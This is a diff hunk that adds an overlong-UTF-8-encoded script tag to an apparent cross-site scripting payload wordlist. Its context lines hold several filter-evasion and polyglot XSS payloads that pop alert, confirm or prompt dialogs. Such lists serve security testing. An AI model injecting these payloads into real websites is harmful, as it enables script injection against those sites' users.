@@ -55,6 +55,7 @@
 "`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
 "`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
 %0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(test)//'">`
+%C0%BCscript%C0%A0src%C0%BD%C0%82mymethod%C0%A8%C0%A9%C0%82%C0%A0%C0%AF%C0%BE
 '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
 '"`><script>/* *\x2Fjavascript:alert(1)// */</script>
 ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
